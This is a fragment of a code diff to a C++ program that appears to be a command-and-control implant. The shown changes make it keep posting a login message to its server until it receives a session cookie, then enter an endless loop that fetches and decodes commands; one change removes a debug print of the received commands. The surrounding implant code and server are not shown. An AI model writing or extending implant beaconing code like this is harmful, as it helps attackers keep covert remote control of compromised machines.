@@ -541,7 +541,13 @@ int main()
     std::wstring l_url = server_url.data();
     l_url.append(L"/login");
     
-    std::wstring cookie = http_req(l_url.data(), b64_login_msg.data(), L"POST", lg, NULL);
+    std::wstring cookie;
+       
+    // The login timer, exits once cookie is populated
+    while (cookie.size() == 0) {
+        cookie = http_req(l_url.data(), b64_login_msg.data(), L"POST", lg, NULL);
+        Sleep(sleep_time);
+    }
             
     // Now get into the main loop
     while (1) {
@@ -554,14 +560,12 @@ int main()
         BYTE* raw = (BYTE*)cmd.data();
         std::string to_decode = (char*)raw;
 
-        std::cout << to_decode << std::endl;
-
         // I dont want to talk about this if statement Ill refactor later I promise
         if (to_decode.length() < 10) {
             int DO_NOTHING = 1;
         }
         else{
-            // Need to cast to char - only sending over ascii or regular bytes
+            // Need to cast to char - only sending over ascii / utf-8
             BYTE* raw = (BYTE*)cmd.data();
             std::string to_decode = (char*)raw;
 
